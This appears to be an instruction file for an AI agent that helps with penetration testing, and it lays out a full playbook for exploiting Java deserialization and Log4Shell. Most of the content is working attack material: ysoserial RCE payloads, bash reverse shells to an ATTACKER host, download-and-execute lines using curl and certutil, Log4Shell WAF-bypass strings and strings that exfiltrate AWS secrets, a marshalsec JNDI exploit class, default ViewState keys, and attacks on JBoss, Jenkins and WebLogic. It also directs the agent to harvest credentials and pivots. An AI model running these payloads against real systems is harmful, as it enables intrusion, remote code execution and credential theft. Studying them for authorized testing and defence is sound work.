---
name: deserialization-java
description: >
  Exploit Java deserialization vulnerabilities during authorized penetration
  testing.
keywords:
  - java deserialization
  - ysoserial
  - gadget chain
  - CommonsCollections
  - JNDI injection
  - log4shell
  - log4j exploit
  - JSF ViewState
  - T3 protocol
  - WebLogic deserialize
  - JBoss deserialize
  - RMI exploit
  - ObjectInputStream
  - readObject exploit
tools:
  - ysoserial
  - marshalsec
  - burpsuite
opsec: medium
---

# Java Deserialization

You are helping a penetration tester exploit Java deserialization
vulnerabilities. The target application deserializes untrusted Java objects,
enabling gadget chain attacks for remote code execution. All testing is under
explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[deserialization-java] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A Java deserialization endpoint (HTTP parameter, cookie, RMI, JMX, T3, JMS)
- Tools: `ysoserial` (`java -jar ysoserial.jar`), optionally `marshalsec`,
  `ysoserial-modified` (for complex shell commands)
- DNS callback receiver (Burp Collaborator, interactsh) for blind detection
- Proxy (Burp Suite) for intercepting and modifying serialized data

## Step 1: Assess

If not already provided, determine:

1. **Serialization format** — look for these signatures:

| Signature | Format | Where Found |
|-----------|--------|-------------|
| `AC ED 00 05` (hex) | Java serialized | Raw binary in request/response |
| `rO0AB` (base64) | Java serialized (b64) | Parameters, cookies, headers |
| `H4sIA` (base64) | Gzip + Java serialized | Compressed serialized data |
| `application/x-java-serialized-object` | Content-Type | HTTP headers |

2. **Entry point type**:
   - HTTP parameters / cookies / headers (base64-encoded)
   - JSF ViewState (`javax.faces.ViewState` parameter, `.faces`/`.xhtml` URLs)
   - RMI (port 1099)
   - T3 protocol (WebLogic, port 7001)
   - JMX (management port)
   - JMS message brokers (ActiveMQ, RabbitMQ)

3. **Server technology** — check response headers, error pages, default files
   for WebLogic, JBoss/WildFly, Tomcat, Jenkins, Spring Boot

Skip if context was already provided.

## Step 2: Blind Detection (URLDNS)

Always start with blind detection before attempting RCE. The URLDNS gadget
uses only JDK classes (no library dependencies) and triggers a DNS lookup:

```bash
# Generate URLDNS payload — triggers DNS callback, no RCE
java -jar ysoserial.jar URLDNS "http://COLLABORATOR.oastify.com" > payload.bin

# Base64 encode for HTTP parameters
java -jar ysoserial.jar URLDNS "http://COLLABORATOR.oastify.com" | base64 -w0

# Send via curl (base64 in parameter)
curl -X POST https://TARGET/endpoint \
  -d "data=$(java -jar ysoserial.jar URLDNS 'http://ID.oastify.com' | base64 -w0)"
```

**If DNS callback received**: deserialization confirmed. Proceed to Step 3.

**If no callback**: try alternative entry points, check if data is
gzip-compressed or differently encoded, or the endpoint may not deserialize.

## Step 3: Identify Gadget Libraries

Determine which libraries are on the target's classpath. Use GadgetProbe
(Burp extension) for black-box detection, or enumerate from error messages,
known framework defaults, or exposed dependency files.

**Common library → gadget chain mapping:**

| Library | Version | Gadget Chains |
|---------|---------|---------------|
| commons-collections 3.x | 3.1-3.2.1 | CommonsCollections1,3,5,6,7 |
| commons-collections 4.x | 4.0 | CommonsCollections2,4 |
| commons-beanutils | 1.9.x | CommonsBeanutils1 |
| spring-core + spring-beans | 4.x | Spring1, Spring2 |
| groovy | 2.3.x | Groovy1 |
| hibernate | various | Hibernate1, Hibernate2 |
| rome | 1.0 | ROME |
| c3p0 | 0.9.5.x | C3P0 |
| bsh (BeanShell) | 2.0b5 | BeanShell1 |
| JDK only (pre-8u20) | <8u20 | Jdk7u21 |

**Framework defaults:**
- **Spring Boot**: commons-collections, spring-core, jackson
- **WebLogic**: commons-collections (older), coherence
- **JBoss**: commons-collections, jboss-interceptors
- **Jenkins**: commons-collections, groovy

If unsure, try CommonsCollections5 first (works on JDK 8u76+), then
CommonsBeanutils1, then CommonsCollections4.

## Step 4: Exploit with ysoserial

### Basic RCE

```bash
# CommonsCollections5 (reliable, JDK 8u76+ compatible)
java -jar ysoserial.jar CommonsCollections5 "COMMAND" | base64 -w0

# CommonsCollections4 (commons-collections4)
java -jar ysoserial.jar CommonsCollections4 "COMMAND" | base64 -w0

# CommonsBeanutils1 (when CommonsCollections chains fail)
java -jar ysoserial.jar CommonsBeanutils1 "COMMAND" | base64 -w0
```

### Runtime.exec() Limitations

`Runtime.exec()` cannot handle shell operators (`|`, `>`, `&`, `;`).
Workarounds:

```bash
# Method 1: bash -c with brace encoding (avoids spaces in args)
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,BASE64_ENCODED_CMD}|{base64,-d}|{bash,-i}'

# Generate the base64 payload:
echo -n 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' | base64
# Then substitute into the brace-encoded command

# Method 2: Use ysoserial-modified (handles pipes/redirects natively)
java -jar ysoserial-modified.jar CommonsCollections5 \
  'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Method 3: Download and execute
java -jar ysoserial.jar CommonsCollections5 \
  'curl http://ATTACKER/shell.sh -o /tmp/s.sh'
# Then:
java -jar ysoserial.jar CommonsCollections5 'bash /tmp/s.sh'

# Windows: certutil download
java -jar ysoserial.jar CommonsCollections5 \
  'cmd /c certutil -urlcache -split -f http://ATTACKER/payload.exe c:\temp\p.exe'
```

### Sending the Payload

```bash
# HTTP POST parameter (base64)
curl -X POST https://TARGET/endpoint \
  -d "param=$(java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0)"

# HTTP cookie
curl https://TARGET/ -b \
  "session=$(java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0)"

# Raw binary (Content-Type: application/x-java-serialized-object)
java -jar ysoserial.jar CommonsCollections5 'id' | \
  curl -X POST https://TARGET/endpoint \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @-
```

## Step 5: JNDI Injection

For endpoints that perform JNDI lookups with attacker-controlled input
(including Log4Shell CVE-2021-44228).

### Log4Shell (CVE-2021-44228)

Affects Log4j 2.0-beta9 through 2.14.1.

**Detection payloads** (inject in any logged field — User-Agent, headers,
form fields, API parameters):

```
${jndi:ldap://COLLABORATOR.oastify.com/a}
${jndi:dns://COLLABORATOR.oastify.com/a}
```

**WAF bypass variants:**
```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://CALLBACK/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//CALLBACK/a}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://CALLBACK/a}
```

**Data exfiltration via Log4Shell:**
```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.CALLBACK/a}
${jndi:ldap://${sys:user.name}.CALLBACK/a}
${jndi:ldap://${java:version}.CALLBACK/a}
${jndi:ldap://${env:HOSTNAME}.CALLBACK/a}
```

### JNDI RCE via marshalsec

```bash
# Terminal 1: Start LDAP referral server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER:8000/#Exploit"

# Terminal 2: Compile exploit class
cat > Exploit.java << 'JAVA'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(
                new String[]{"bash", "-c", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"});
        } catch (Exception e) { e.printStackTrace(); }
    }
}
JAVA
javac Exploit.java -source 8 -target 8

# Terminal 3: Serve the class file
python3 -m http.server 8000

# Trigger: inject JNDI URL into vulnerable parameter
${jndi:ldap://ATTACKER:1389/Exploit}
```

**Note:** Remote class loading blocked on JDK 8u121+ (RMI) and 6u141+/8u121+
(LDAP). For modern JDKs, use deserialization gadgets via JNDI instead:

```bash
# Generate serialized gadget
java -jar ysoserial.jar CommonsCollections5 'COMMAND' > /tmp/payload.ser

# Serve via JNDI-Injection-Exploit (handles modern JDK restrictions)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -L ATTACKER:1389 -P /tmp/payload.ser
```

## Step 6: JSF ViewState Deserialization

For JSF applications (`.faces`, `.xhtml` URLs) with `javax.faces.ViewState`.

**Detection:**
- Parameter `javax.faces.ViewState` in POST requests
- Base64 prefix `rO0AB` (raw) or `H4sIA` (gzip)
- Framework: Oracle Mojarra or Apache MyFaces

**MyFaces with default/weak encryption keys:**

| Algorithm | Default Secret |
|-----------|---------------|
| AES CBC | `NzY1NDMyMTA3NjU0MzIxMA==` |
| DES | `NzY1NDMyMTA=` |
| DESede | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |

If ViewState is not encrypted or uses default keys, generate payload with
ysoserial and inject as `javax.faces.ViewState` parameter.

## Step 7: Framework-Specific Attacks

### WebLogic (T3 Protocol)

```bash
# Detect T3 protocol (port 7001)
nmap -p 7001 --script weblogic-t3-info TARGET

# Exploit via T3 with ysoserial payload
# Use CVE-2015-4852 or later T3 deserialization CVEs
python3 weblogic_t3_exploit.py -t TARGET -p 7001 \
  -y ysoserial.jar -g CommonsCollections1 -c "id"
```

### JBoss

```bash
# Check for exposed invoker servlets
curl -v http://TARGET/invoker/JMXInvokerServlet
curl -v http://TARGET/invoker/EJBInvokerServlet

# If accessible, send ysoserial payload directly
java -jar ysoserial.jar CommonsCollections5 'id' | \
  curl -X POST http://TARGET/invoker/JMXInvokerServlet \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @-

# Automated: JexBoss
python3 jexboss.py -u http://TARGET:8080
```

### Jenkins

```bash
# Jenkins CLI protocol uses serialized objects
# Check for /cli endpoint
curl http://TARGET/cli

# Exploit pre-2.x Jenkins with commons-collections
java -jar ysoserial.jar CommonsCollections1 'id' | \
  curl -X POST http://TARGET/cli \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @-
```

## Step 8: Escalate or Pivot

## OPSEC Notes

- URLDNS payloads generate DNS traffic — visible to network monitoring
- ysoserial payloads may trigger IDS/WAF signatures (commons-collections
  class names in serialized data)
- Log4Shell payloads logged extensively — assume blue team visibility
- JNDI exploitation requires attacker-controlled LDAP/RMI server — outbound
  connection from target is visible
- JBoss/WebLogic invoker servlets are commonly monitored endpoints

## Troubleshooting

### Gadget Chain Throws Exception

- Try different chains: CommonsCollections5 → CommonsBeanutils1 →
  CommonsCollections4 → ROME → Groovy1
- Check JDK version: Jdk7u21 only works pre-8u20
- The target may have patched commons-collections — try chains using
  other libraries

### Runtime.exec() Command Fails Silently

- `Runtime.exec()` does not support shell operators
- Use bash brace encoding or ysoserial-modified
- Test with simple command first (`touch /tmp/proof`, `ping ATTACKER`)
- On Windows, prefix with `cmd /c`

### JNDI Lookup Blocked (Modern JDK)

- JDK 8u121+ blocks remote class loading via RMI/LDAP
- Use deserialization gadgets served via JNDI instead of remote classes
- Use JNDI-Injection-Exploit or marshalsec with serialized payloads

### No DNS Callback from URLDNS

- Verify the parameter actually reaches `ObjectInputStream.readObject()`
- Check if data needs to be gzip-compressed before base64
- Try sending raw binary instead of base64
- Endpoint may use a custom `ObjectInputStream` with class filtering
